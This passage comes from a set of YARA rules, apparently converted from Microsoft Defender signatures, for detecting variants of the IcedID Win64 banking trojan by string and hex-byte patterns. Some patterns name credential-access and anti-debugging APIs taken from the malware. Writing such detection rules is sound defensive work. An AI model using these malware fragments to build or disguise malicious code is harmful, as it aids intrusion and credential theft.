        $x_2_5 = "CoOcNu" ascii //weight: 2
        $x_1_6 = "CreateFileW" ascii //weight: 1
        $x_1_7 = "RasGetCredentialsA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MA_2147815506_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MA!MTB"
        threat_id = "2147815506"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {08 48 89 74 71 3e 4b 89 44 24 18 55 02 6f 59 48 8b ec 48 83 b9 4e 47 8b f9 4d 8b f1 ec 31 11 5a}  //weight: 3, accuracy: High
        $x_3_2 = {30 48 3b f9 27 25 84 42 40 48 03 c1 1d 15 f7 72 05 48 8b 12 be f0 47 85 c9 0f 84 f4 55 2e 0f 4c}  //weight: 3, accuracy: High
        $x_3_3 = {8b c0 4c 63 87 66 96 83 e2 03 48 03 97 ad ef 03 48 2b c2 48 36 e6 4e 0f b6 04 1a 44 5a 98 4b 0d}  //weight: 3, accuracy: High
        $x_1_4 = "init" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MA_2147815506_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MA!MTB"
        threat_id = "2147815506"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "30"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "ygasbdjkbsydujhaksdasds" ascii //weight: 10
        $x_5_2 = "BHeGLDOQnpCSyMbMqEtO" ascii //weight: 5
        $x_5_3 = "EipujbJNNBjvNdAgEyfFdXyb" ascii //weight: 5
        $x_5_4 = "FEimWpJuTqdNVkAgAGuGyH" ascii //weight: 5
        $x_5_5 = "KPQbBTdEoCSpmkJQIItu" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MA_2147815506_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MA!MTB"
        threat_id = "2147815506"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sayufbasufygajfhugajsasf" ascii //weight: 1
        $x_1_2 = "KBNLonfAFEUmHqg" ascii //weight: 1
        $x_1_3 = "KBdWsSkYkHYwz" ascii //weight: 1
        $x_1_4 = "MQnkXNgwqrCdLf" ascii //weight: 1
        $x_1_5 = "QapUJVUgnsANnonP" ascii //weight: 1
        $x_1_6 = "QrSkWFzxplZRSl" ascii //weight: 1
        $x_1_7 = "NztdmBrTYSD" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_S_2147815690_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.S!MTB"
        threat_id = "2147815690"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "21"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {8a ca 48 8b d0 48 d3 ca 49 33 d0 4b 87 94 fe b8 5b 02 00 eb 2d}  //weight: 10, accuracy: High
        $x_10_2 = {41 8b c2 b9 40 00 00 00 83 e0 3f 2b c8 48 d3 cf 49 33 fa 4b 87 bc fe ?? ?? ?? ?? 33 c0 48 8b 5c 24 50 48 8b 6c 24 58 48 8b 74 24 60}  //weight: 10, accuracy: Low
        $x_1_3 = "DllRegisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AC_2147815884_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AC!MTB"
        threat_id = "2147815884"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 8b 44 24 38 0f b6 00 0f b6 4c 24 40 33 c1 48 8b 4c 24 60 48 8b 54 24 38 48 2b d1 48 8b ca 0f b6 c9 83 e1 08 33 c1 48 8b 4c 24 38 88 01 48 63 44 24 20 48 8b 4c 24 38 48 03 c8 48 8b c1 48 89 44 24 38}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AC_2147815884_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AC!MTB"
        threat_id = "2147815884"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b c1 48 63 4c 24 ?? e9 ?? ?? ?? ?? 8b 4c 24 ?? 33 c8 3a f6 74 ?? 89 84 24 ?? ?? ?? ?? 48 ?? ?? ?? ?? 66 ?? ?? 74}  //weight: 1, accuracy: Low
        $x_1_2 = {48 89 04 24 e9 ?? ?? ?? ?? 33 c0 eb ?? 48 ?? ?? ?? ?? 48 ?? ?? ?? ?? e9 ?? ?? ?? ?? 48 ?? ?? ?? ?? 48 ?? ?? ?? 48 ?? ?? ?? ?? e9 ?? ?? ?? ?? 48 ?? ?? ?? 48}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AM_2147815885_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AM!MTB"
        threat_id = "2147815885"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {0f b6 0a 48 ff c2 41 88 08 4d 8d 40 01 48 83 e8 01 75 ed 45 0f b7 4d 14 45 0f b7 55 06 49 83 c1 2c 4d 85 d2 74 45 4d 03 cd 0f 1f 80 00 00 00 00 41 8b 49 f8 49 ff ca 41 8b 11 49 03 ce 45 8b 41 fc 48 03 d5 4d 85 c0}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AM_2147815885_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AM!MTB"
        threat_id = "2147815885"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "BUupREZ9dc" ascii //weight: 2
        $x_2_2 = "D0cLh73Zik4" ascii //weight: 2
        $x_2_3 = "GNlPdD" ascii //weight: 2
        $x_2_4 = "Zta8XbWJyyj" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AM_2147815885_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AM!MTB"
        threat_id = "2147815885"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "DuuTgbq" ascii //weight: 2
        $x_2_2 = "PJQjdcf" ascii //weight: 2
        $x_2_3 = "WHRI2H2" ascii //weight: 2
        $x_2_4 = "WTf2E8" ascii //weight: 2
        $x_2_5 = "WXmNQWiQcd" ascii //weight: 2
        $x_2_6 = "hfdfasdfc" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AM_2147815885_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AM!MTB"
        threat_id = "2147815885"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "CXBjU.dll" ascii //weight: 10
        $x_1_2 = "JXbIgK0" ascii //weight: 1
        $x_1_3 = "KxEYrRLGtou" ascii //weight: 1
        $x_1_4 = "RS2a9q125" ascii //weight: 1
        $x_1_5 = "RV3ZS3" ascii //weight: 1
        $x_1_6 = "Td3Utp461" ascii //weight: 1
        $x_1_7 = "PluginInit" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AM_2147815885_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AM!MTB"
        threat_id = "2147815885"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "ARAN8FFOGYE" ascii //weight: 3
        $x_3_2 = "AZng1vzN" ascii //weight: 3
        $x_3_3 = "Av2rCklyyzu" ascii //weight: 3
        $x_3_4 = "CallWindowProcW" ascii //weight: 3
        $x_3_5 = "RasDialW" ascii //weight: 3
        $x_3_6 = "RasEnumConnectionsW" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AM_2147815885_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AM!MTB"
        threat_id = "2147815885"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DllRegisterServer" ascii //weight: 1
        $x_1_2 = "dgEafw" ascii //weight: 1
        $x_1_3 = "StgCreateDocfileOnILockBytes" ascii //weight: 1
        $x_1_4 = "CreateILockBytesOnHGlobal" ascii //weight: 1
        $x_1_5 = "HtmlHelpW" ascii //weight: 1
        $x_1_6 = "hhctrl.ocx" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_QR_2147815972_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.QR!MTB"
        threat_id = "2147815972"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {41 8b c8 83 e1 3f 2b d1 8a ca 48 8b d0 48 d3 ca 49 33 d0 4b 87 94 fe b8 db 01 00 eb 2d}  //weight: 10, accuracy: High
        $x_1_2 = "DllRegisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BY_2147817040_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BY!MTB"
        threat_id = "2147817040"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {2b d1 8a ca 48 8b d0 48 d3 ca 49 33 d0 4b 87 94 fe b8 6b 02 00 eb 2d}  //weight: 10, accuracy: High
        $x_10_2 = {41 8b c2 b9 40 00 00 00 83 e0 3f 2b c8 48 d3 cf 49 33 fa 4b 87 bc fe ?? ?? ?? ?? 33 c0 48 8b 5c 24 50 48 8b 6c 24 58 48 8b 74 24 60 48 83 c4 20 41 5f 41 5e 41 5d 41 5c 5f c3}  //weight: 10, accuracy: Low
        $x_1_3 = "DllRegisterServer" ascii //weight: 1
        $x_1_4 = "IsDebuggerPresent" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MC_2147817156_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MC!MTB"
        threat_id = "2147817156"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {65 48 8b 04 25 30 00 00 00}  //weight: 1, accuracy: High
        $x_1_2 = {48 8b 40 60 48 8b 40 20 48 8d 54 24 60 e9 3d 02 00 00}  //weight: 1, accuracy: High
        $x_5_3 = {48 8b 4c 24 48 0f b6 44 01 10 8b 4c 24 78 66 3b db 74 50}  //weight: 5, accuracy: High
        $x_5_4 = {33 c8 8b c1 48 63 4c 24 44 e9 a4 00 00 00}  //weight: 5, accuracy: High
        $x_5_5 = {48 8b 54 24 58 88 04 0a e9 dc fd ff ff}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MC_2147817156_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MC!MTB"
        threat_id = "2147817156"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "A1ncZC7O" ascii //weight: 1
        $x_1_3 = "BqDkWx" ascii //weight: 1
        $x_1_4 = "DkRXNmgMrG" ascii //weight: 1
        $x_1_5 = "KrP3scf" ascii //weight: 1
        $x_1_6 = "PTO5.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MC_2147817156_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MC!MTB"
        threat_id = "2147817156"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "fahgdagyusdajsdkas" ascii //weight: 10
        $x_1_2 = "DK5djWC" ascii //weight: 1
        $x_1_3 = "DOhEMPcAv" ascii //weight: 1
        $x_1_4 = "QMYaZN8" ascii //weight: 1
        $x_1_5 = "QRItwJfm" ascii //weight: 1
        $x_1_6 = "UisG1taM" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MC_2147817156_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MC!MTB"
        threat_id = "2147817156"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {48 8b 44 24 30 48 89 04 24 eb ?? 48 8b 44 24 38 48 89 44 24 08 eb ?? 48 8b 04 24 48 ff c0 eb ?? 8a 09 88 08 eb ?? 48 89 4c 24 08 48 83 ec 28 eb ?? 48 ff c0 48 89 44 24 08 eb}  //weight: 10, accuracy: Low
        $x_2_2 = "BnQxtZwJemyOM" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MC_2147817156_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MC!MTB"
        threat_id = "2147817156"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "vluZgpyoJkyPZlzYL" ascii //weight: 5
        $x_2_2 = "cIFFAccessTagMethods" ascii //weight: 2
        $x_2_3 = "cIFFCIELabToRGBInit" ascii //weight: 2
        $x_2_4 = "cIFFCIELabToXYZ" ascii //weight: 2
        $x_2_5 = "cIFFCheckTile" ascii //weight: 2
        $x_2_6 = "cIFFCheckpointDirectory" ascii //weight: 2
        $x_2_7 = "cIFFCleanup" ascii //weight: 2
        $x_2_8 = "cIFFClientOpen" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BXF_2147817781_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BXF!MTB"
        threat_id = "2147817781"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {49 89 51 08 41 89 41 1c 0f b6 0a 83 e1 0f 4a 0f be 84 11 ?? ?? ?? ?? 42 8a 8c 11 ?? ?? ?? ?? 48 2b d0 8b 42 fc d3 e8 41 89 41 20 48 8d 42 04 49 89 51 08 8b 0a 49 89 41 08 41 89 49 24 49 83 e8 01 0f 85 ec}  //weight: 10, accuracy: Low
        $x_10_2 = {44 8b cb 41 8b ca 4c 8b c7 4c 33 15 ?? ?? ?? ?? 83 e1 3f 49 d3 ca 48 8b d6 4d 85 d2 74 0f 48 8b 4c 24 60 49 8b c2 48 89 4c 24 20 eb ae}  //weight: 10, accuracy: Low
        $x_1_3 = "DllRegisterServer" ascii //weight: 1
        $x_1_4 = "aqilktdevozafmt" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AN_2147817970_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AN!MTB"
        threat_id = "2147817970"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CFIuVMFaW" ascii //weight: 1
        $x_1_2 = "FKQqKmQb" ascii //weight: 1
        $x_1_3 = "HemZjAYqKi" ascii //weight: 1
        $x_1_4 = "JEXYHjHeB" ascii //weight: 1
        $x_1_5 = "PluginInit" ascii //weight: 1
        $x_1_6 = "SlmlahwY" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BZ_2147818054_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BZ!MTB"
        threat_id = "2147818054"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {4c 8b c1 8b ca 48 33 15 81 cc 06 00 83 e1 3f 48 d3 ca 48 85 d2 75 03}  //weight: 10, accuracy: High
        $x_1_2 = "A9xsQAP2Ccq" ascii //weight: 1
        $x_1_3 = "IsDebuggerPresent" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AJ_2147818257_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AJ!MTB"
        threat_id = "2147818257"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "AcVneVhHlez" ascii //weight: 1
        $x_1_2 = "AjwTJfJu" ascii //weight: 1
        $x_1_3 = "DaEmKbC" ascii //weight: 1
        $x_1_4 = "DfUKyEteS" ascii //weight: 1
        $x_1_5 = "PluginInit" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AJ_2147818257_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AJ!MTB"
        threat_id = "2147818257"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "AY7xpQ" ascii //weight: 2
        $x_2_2 = "Ae4uJg" ascii //weight: 2
        $x_2_3 = "B2AgakkN8" ascii //weight: 2
        $x_2_4 = "B33DCFs1" ascii //weight: 2
        $x_2_5 = "BHo3JumGn" ascii //weight: 2
        $x_2_6 = "BYW1R7WUe41" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DD_2147818480_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DD!MTB"
        threat_id = "2147818480"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "dVmGI.dll" ascii //weight: 1
        $x_1_3 = "B04sWXlDHO6" ascii //weight: 1
        $x_1_4 = "GKVdmkmq6e" ascii //weight: 1
        $x_1_5 = "stRoUjqQpP" ascii //weight: 1
        $x_1_6 = "vb2GvablfNZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MD_2147818485_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MD!MTB"
        threat_id = "2147818485"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {f7 ea c1 fa ?? 89 c8 c1 f8 ?? 29 c2 89 d0 01 c0 89 c2 c1 e2 ?? 01 d0 29 c1 89 c8 48 63 d0 48 8b 85 ?? ?? ?? ?? 48 01 d0 0f b6 00 44 31 c8 41 88 00 83 85 ?? ?? ?? ?? 01 8b 95 ?? ?? ?? ?? 8b 85 ?? ?? ?? ?? 39 c2 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MD_2147818485_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MD!MTB"
        threat_id = "2147818485"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "AkqEW.dll" ascii //weight: 1
        $x_1_3 = "JriaADvP7dL" ascii //weight: 1
        $x_1_4 = "ZGnU2BqBgpp" ascii //weight: 1
        $x_1_5 = "hOn42ebb3" ascii //weight: 1
        $x_1_6 = "s0JrpydTaqp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MD_2147818485_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MD!MTB"
        threat_id = "2147818485"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {48 89 44 24 08 48 8b 44 24 30 eb 00 48 ff c8 48 89 44 24 30 eb 92 eb 9e 48 8b 44 24 28 48 89 44 24 08 eb 84 48 8b 44 24 20 48 89 04 24 66 3b ed 74 e6 88 08 48 8b 04 24 66 3b ff 74 9d}  //weight: 5, accuracy: High
        $x_5_2 = "hiausfbusjafkhyasjfk" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MD_2147818485_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MD!MTB"
        threat_id = "2147818485"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {48 89 04 24 48 8b 44 24 08 eb e9 48 8b 44 24 40 48 ff c8 eb 28 48 8b 04 24 48 ff c0 eb e2 4c 89 44 24 18 48 89 54 24 10 eb bf 48 8b 44 24 38 48 89 44 24 08 eb 21 8a 09 88 08 eb d9}  //weight: 1, accuracy: High
        $x_1_2 = {69 66 78 64 64 70 2e 64 6c 6c 00 44 6c 6c 52 65 67 69 73 74 65 72 53 65 72 76 65 72 00 45 70 48 55 48 55 4d 46 45 69 67 48 6f 75}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_FU_2147818536_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.FU!MTB"
        threat_id = "2147818536"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {48 8b 8b e8 02 00 00 49 83 c0 02 48 8b 83 ?? ?? ?? ?? 48 81 f1 d2 36 00 00 48 89 48 18 49 83 eb 01 0f 85}  //weight: 10, accuracy: Low
        $x_1_2 = "pGUAYVFxbN" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MF_2147818571_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MF!MTB"
        threat_id = "2147818571"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "DllMain" ascii //weight: 10
        $x_1_2 = "WZSKd2NEBI.dll" ascii //weight: 1
        $x_1_3 = "FZKlWfNWN" ascii //weight: 1
        $x_1_4 = "RPrWVBw" ascii //weight: 1
        $x_1_5 = "kCXkdKtadW" ascii //weight: 1
        $x_1_6 = "pRNAU" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MF_2147818571_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MF!MTB"
        threat_id = "2147818571"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {44 0f af 43 58 48 8b 83 a8 00 00 00 44 89 93 dc 00 00 00 41 8b d0 c1 ea 08 88 14 01 ff 43 5c 48 63 4b 5c 48 8b 83 a8 00 00 00 44 88 04 01 ff 43 5c 8b 8b e8 00 00 00 8b d1 44 8b 83 dc 00 00 00 41 2b d0 8b 43 38 41 03 d2 03 c1}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MF_2147818571_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MF!MTB"
        threat_id = "2147818571"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
